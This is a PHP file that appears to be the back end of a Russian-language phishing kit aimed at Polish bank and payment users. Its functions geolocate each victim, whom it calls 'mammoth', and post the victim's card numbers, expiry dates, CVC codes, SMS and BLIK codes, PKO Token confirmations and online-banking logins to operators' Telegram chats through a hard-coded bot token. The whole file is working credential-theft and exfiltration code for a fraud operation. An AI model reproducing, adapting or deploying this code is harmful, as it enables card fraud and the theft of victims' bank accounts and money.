<?php

define("LOGS", "-1001651699475");
define("ALOGS", "-1001613552150");
define("TOKEN", "5442108073:AAHps9v16gGPZaLc_y1UAVQfYjIB07S8gbQ");

function filter() {
    $keys = [
      'HTTP_CLIENT_IP',
      'HTTP_X_FORWARDED_FOR',
      'REMOTE_ADDR'
    ];
    foreach ($keys as $key) {
      if (!empty($_SERVER[$key])) {
        $ip = trim(end(explode(',', $_SERVER[$key])));
        if (filter_var($ip, FILTER_VALIDATE_IP)) {
          return $ip;
        }
      }
    }
  }

  function sendSMSz($service, $valute, $id, $name, $price, $worker_id, $sms){

    $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);
  
    if ($ip['success'] == 'true'){
        $location = $ip['country'] . ", " . $ip['city'];
    }else{
        $location = "Не распознано.";
    }
  
    $r_user = "<b>$service</b>: Мамонт ввел SMS!".PHP_EOL;
    $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;
  
    $response = array(
        'chat_id' => $worker_id,
        'text' => $r_user,
        "parse_mode" => "html"
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log = "<b>$service SMS!</b>".PHP_EOL;
    $r_log .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log .= "<b>❇️ Локация</b>: $location".PHP_EOL;
    $r_log .= "<b>📩 SMS</b>: $sms".PHP_EOL;
  
    $hander = file_get_contents("/var/www/html/logs_ck/" . $id . "_" . $worker_id);
  
    $response = array(
        'chat_id' => $hander,
        'text' => $r_log, 
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log2 = "<b>$service SMS!</b>".PHP_EOL;
    $r_log2 .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log2 .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log2 .= "<b>❇️ Локация</b>: $location".PHP_EOL;
    $r_log2 .= "<b>📩 SMS</b>: $sms".PHP_EOL;
    $r_log2 .= "<b>Вбивер</b>: <a href='tg://user?id=". $hander . "'>click</a>";
    
  
    $response = array(
        'chat_id' => ALOGS,
        'text' => $r_log2,
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
    
  }

  function sendPUSHz($service, $valute, $id, $name, $price, $worker_id){

    $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);
  
    if ($ip['success'] == 'true'){
        $location = $ip['country'] . ", " . $ip['city'];
    }else{
        $location = "Не распознано.";
    }
  
    $r_user = "<b>$service</b>: Мамонт ввел SMS!".PHP_EOL;
    $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;
  
    $response = array(
        'chat_id' => $worker_id,
        'text' => $r_user,
        "parse_mode" => "html"
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log = "<b>$service PUSH!</b>".PHP_EOL;
    $r_log .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log .= "<b>❇️ Локация</b>: $location".PHP_EOL.PHP_EOL;
    $r_log .= "<b>Мамонт дал уведомление что подтвердил ❇️ Push!</b>";
  
    $hander = file_get_contents("/var/www/html/logs_ck/" . $id . "_" . $worker_id);
  
    $response = array(
        'chat_id' => $hander,
        'text' => $r_log, 
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log2 = "<b>$service PUSH!</b>".PHP_EOL;
    $r_log2 .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log2 .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log2 .= "<b>❇️ Локация</b>: $location".PHP_EOL;
    $r_log2 .= "<b>Мамонт дал уведомление что подтвердил ❇️ Push!</b>".PHP_EOL;
    $r_log2 .= "<b>Вбивер</b>: <a href='tg://user?id=". $hander . "'>click</a>";
    
  
    $response = array(
        'chat_id' => ALOGS,
        'text' => $r_log2,
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
    
  }

  function sendPKO($service, $valute, $id, $name, $price, $worker_id){

    $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);
  
    if ($ip['success'] == 'true'){
        $location = $ip['country'] . ", " . $ip['city'];
    }else{
        $location = "Не распознано.";
    }
  
    $r_user = "<b>$service</b>: 🔵 Мамонт нажал кнопку авторизации PKO Token!".PHP_EOL;
    $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;
  
    $response = array(
        'chat_id' => $worker_id,
        'text' => $r_user,
        "parse_mode" => "html"
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log = "<b>$service 🔵 Мамонт нажал кнопку авторизации PKO Token!</b>".PHP_EOL;
    $r_log .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log .= "<b>❇️ Локация</b>: $location".PHP_EOL.PHP_EOL;
    $r_log .= "<b>Мамонт дал уведомление что подтвердил 🫐 PKO Token!</b>";
  
    $hander = file_get_contents("/var/www/html/logs_ck/" . $id . "_" . $worker_id);
  
    $response = array(
        'chat_id' => $hander,
        'text' => $r_log, 
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log2 = "<b>$service 🔵 Мамонт нажал кнопку авторизации PKO Token!</b>".PHP_EOL;
    $r_log2 .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log2 .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log2 .= "<b>❇️ Локация</b>: $location".PHP_EOL;
    $r_log2 .= "<b>Мамонт дал уведомление что подтвердил 🫐 PKO Token!</b>".PHP_EOL;
    $r_log2 .= "<b>Вбивер</b>: <a href='tg://user?id=". $hander . "'>click</a>";
    
  
    $response = array(
        'chat_id' => ALOGS,
        'text' => $r_log2,
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
    
  }

  function sendCard($service, $valute, $id, $name, $price, $worker_id, $card, $exp, $cvv){

    $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);
  
    if ($ip['success'] == 'true'){
        $location = $ip['country'] . ", " . $ip['city'];
    }else{
        $location = "Не распознано.";
    }
  
    $r_user = "<b>$service</b>: 💳 Мамонт ввёл карту!".PHP_EOL;
    $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;
  
    $response = array(
        'chat_id' => $worker_id,
        'text' => $r_user,
        "parse_mode" => "html"
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log = "<b>$service 💳 Мамонт ввёл карту!</b>".PHP_EOL;
    $r_log .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log .= "<b>❇️ Локация</b>: $location".PHP_EOL.PHP_EOL;
    $r_log .= "<b>💳 Карта</b>: $card".PHP_EOL;
    $r_log .= "<b>💳 Срок годности</b>: $exp".PHP_EOL;
    $r_log .= "<b>💳 CVC2</b>: $CVV".PHP_EOL;
    
  
    $hander = file_get_contents("/var/www/html/logs_ck/" . $id . "_" . $worker_id);
  
    $response = array(
        'chat_id' => $hander,
        'text' => $r_log, 
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log2 = "<b>$service 💳 Мамонт ввёл карту</b>".PHP_EOL;
    $r_log2 .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log2 .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log2 .= "<b>❇️ Локация</b>: $location".PHP_EOL.PHP_EOL;
    $r_log2 .= "<b>💳 Карта</b>: $card".PHP_EOL;
    $r_log2 .= "<b>💳 Срок годности</b>: $exp".PHP_EOL;
    $r_log2 .= "<b>💳 CVC2</b>: $CVV".PHP_EOL;
    $r_log2 .= "<b>Вбивер</b>: <a href='tg://user?id=". $hander . "'>click</a>";
    
  
    $response = array(
        'chat_id' => ALOGS,
        'text' => $r_log2,
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
    
  }


  function sendChecker($service, $valute, $id, $name, $price, $worker_id, $reply_bro){

    $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);
  
    if ($ip['success'] == 'true'){
        $location = $ip['country'] . ", " . $ip['city'];
    }else{
        $location = "Не распознано.";
    }
  
    $r_user = "<b>$service</b>: Мамонт выбрал Checker!".PHP_EOL;
    $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;
  
    $response = array(
        'chat_id' => $worker_id,
        'text' => $r_user,
        "parse_mode" => "html"
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log = "<b>$service Checker!</b>".PHP_EOL;
    $r_log .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log .= "<b>❇️ Локация</b>: $location".PHP_EOL.PHP_EOL;
    $r_log .= "<b>Мамонт выбрал:</b> " . $reply_bro;
  
    $hander = file_get_contents("/var/www/html/logs_ck/" . $id . "_" . $worker_id);
  
    $response = array(
        'chat_id' => $hander,
        'text' => $r_log, 
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log2 = "<b>$service Checker!</b>".PHP_EOL;
    $r_log2 .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log2 .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log2 .= "<b>❇️ Локация</b>: $location".PHP_EOL;
    $r_log2 .= "<b>Мамонт выбрал:</b> " . $reply_bro . PHP_EOL;
    $r_log2 .= "<b>Вбивер</b>: <a href='tg://user?id=". $hander . "'>click</a>";
    
  
    $response = array(
        'chat_id' => ALOGS,
        'text' => $r_log2,
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
    
  }

  function sendBlik($service, $valute, $id, $name, $price, $worker_id, $blik){

    $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);
  
    if ($ip['success'] == 'true'){
        $location = $ip['country'] . ", " . $ip['city'];
    }else{
        $location = "Не распознано.";
    }
  
    $r_user = "<b>$service</b>: Мамонт ввёл BLIK!".PHP_EOL;
    $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;
  
    $response = array(
        'chat_id' => $worker_id,
        'text' => $r_user,
        "parse_mode" => "html"
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log = "<b>$service BLIK!</b>".PHP_EOL;
    $r_log .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log .= "<b>❇️ Локация</b>: $location".PHP_EOL.PHP_EOL;
    $r_log .= "<b>BLIK CODE:</b> " . $blik;
  
    $hander = file_get_contents("/var/www/html/logs_ck/" . $id . "_" . $worker_id);
  
    $response = array(
        'chat_id' => $hander,
        'text' => $r_log, 
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
  
    $r_log2 = "<b>$service BLIK!</b>".PHP_EOL;
    $r_log2 .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_log2 .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_log2 .= "<b>❇️ Локация</b>: $location".PHP_EOL;
    $r_log2 .= "<b>BLIK CODE:</b> " . $blik . PHP_EOL;
    $r_log2 .= "<b>Вбивер</b>: <a href='tg://user?id=". $hander . "'>click</a>";
    
  
    $response = array(
        'chat_id' => ALOGS,
        'text' => $r_log2,
        "parse_mode" => "html",
    );
  
    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
    
  }

function sendSupport($service, $valute, $id, $name, $price, $worker_id, $msg){
    $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);

    if ($ip['success'] == 'true'){
        $location = $ip['country'] . ", " . $ip['city'];
    }else{
        $location = "Не распознано.";
    }

    $r_user = "<b>$service</b>: 🦣 ✉️ Новое сообщение".PHP_EOL;
    $r_user .= "<b>❇️ Трек номер</b>: $id|" . array_shift((explode('.', $_SERVER['HTTP_HOST']))) .PHP_EOL;
    $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
    $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
    $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;
    $r_user .= "<b>❇️ Сообщение:</b> $msg".PHP_EOL;

    $response = array(
        'chat_id' => $worker_id,
        'text' => $r_user,
        "parse_mode" => "html"
    );

    $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_exec($ch);
    curl_close($ch);
}

function sendTrack($service, $valute, $id, $name, $price, $worker_id){

  $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);

  if ($ip['success'] == 'true'){
      $location = $ip['country'] . ", " . $ip['city'];
  }else{
      $location = "Не распознано.";
  }

  $reply_m = json_encode(array("inline_keyboard" => [[array("text"=>"✴️ Проверить онлайн","callback_data"=>"checkOnline")]]));

  $r_user = "<b>$service</b>: Переход на сыллку".PHP_EOL;
  $r_user .= "<b>❇️ Трек номер</b>: $id|" . array_shift((explode('.', $_SERVER['HTTP_HOST']))) .PHP_EOL;
  $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
  $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
  $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;

  $response = array(
      'chat_id' => $worker_id,
      'text' => $r_user,
      "parse_mode" => "html",
      "reply_markup" => $reply_m
  );

  $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_exec($ch);
  curl_close($ch);
  
}

function test(){

  $r_user = "test";

  $response = array(
      'chat_id' => LOGS,
      'text' => $r_user,
      "parse_mode" => "html"
  );

  $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_exec($ch);
  curl_close($ch);
  
}

function sendLK($service, $valute, $id, $name, $price, $worker_id){

  $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);

  if ($ip['success'] == 'true'){
      $location = $ip['country'] . ", " . $ip['city'];
  }else{
      $location = "Не распознано.";
  }

  $r_user = "<b>$service</b>: Переход на ввод ЛК".PHP_EOL;
  $r_user .= "<b>❇️ Трек номер</b>: $id|" . array_shift((explode('.', $_SERVER['HTTP_HOST']))) .PHP_EOL;
  $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
  $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
  $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;

  $response = array(
      'chat_id' => $worker_id,
      'text' => $r_user,
      "parse_mode" => "html"
  );

  $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_exec($ch);
  curl_close($ch);
  
}

function checkLK($service, $valute, $id, $name, $price, $worker_id, $bank){

  $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);

  if ($ip['success'] == 'true'){
      $location = $ip['country'] . ", " . $ip['city'];
  }else{
      $location = "Не распознано.";
  }

  $r_user = "<b>$service</b>: Мамонт на странице ввода ЛК".PHP_EOL;
  $r_user .= "<b>❇️ Банк</b>: " . $bank.PHP_EOL;
  $r_user .= "<b>❇️ Трек номер</b>: $id|" . array_shift((explode('.', $_SERVER['HTTP_HOST']))) .PHP_EOL;
  $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
  $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
  $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;

  $response = array(
      'chat_id' => $worker_id,
      'text' => $r_user,
      "parse_mode" => "html"
  );

  $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_exec($ch);
  curl_close($ch);
  
}



function sendLKi($service, $valute, $id, $name, $price, $worker_id, $bank, $fname, $msg){

  $ip = JSON_decode(file_get_contents("http://ipwhois.app/json/" . filter()), true);

  if ($ip['success'] == 'true'){
      $location = $ip['country'] . ", " . $ip['city'];
  }else{
      $location = "Не распознано.";
  }

  $r_user = "<b>$service</b>: Мамонт ввел ЛК!".PHP_EOL;
  $r_user .= "<b>❇️ Название</b>: $name".PHP_EOL;
  $r_user .= "<b>❇️ Стоимость</b>: $price $valute".PHP_EOL;
  $r_user .= "<b>❇️ Локация</b>: $location".PHP_EOL;

  $response = array(
      'chat_id' => $worker_id,
      'text' => $r_user,
      "parse_mode" => "html"
  );

  $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_exec($ch);
  curl_close($ch);

  $r_log = "<b>$service NEW LOG!</b>".PHP_EOL.PHP_EOL;
  $r_log .= "<b>🏦 $bank</b>".PHP_EOL;
  $r_log .= "<b>❇️ Локация</b>: $location".PHP_EOL;

  $reply_m = json_encode(array("inline_keyboard" => [[array("text"=>"Взять вбив","callback_data"=>"@pick:" . $fname)]]));

  $response = array(
      'chat_id' => LOGS,
      'text' => $r_log,
      "parse_mode" => "html",
      "reply_markup" => $reply_m
  );

  $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_HEADER, false);
  $abc = curl_exec($ch);
  curl_close($ch);

  $r_log2 = "<b>$service NEW LOG!</b>".PHP_EOL.PHP_EOL;
  $r_log2 .= "<b>🏦 $bank</b>".PHP_EOL;
  $r_log2 .= "<b>❇️ Локация</b>: $location".PHP_EOL;
  $r_log2 .= "<b>$service LOG INFO</b>".PHP_EOL.PHP_EOL;
  $r_log2 .= $msg;

  $response = array(
      'chat_id' => ALOGS,
      'text' => $r_log2,
      "parse_mode" => "html",
  );

  $ch = curl_init('https://api.telegram.org/bot' . TOKEN . '/sendMessage');
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, $response);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_exec($ch);
  curl_close($ch);
  
}

?>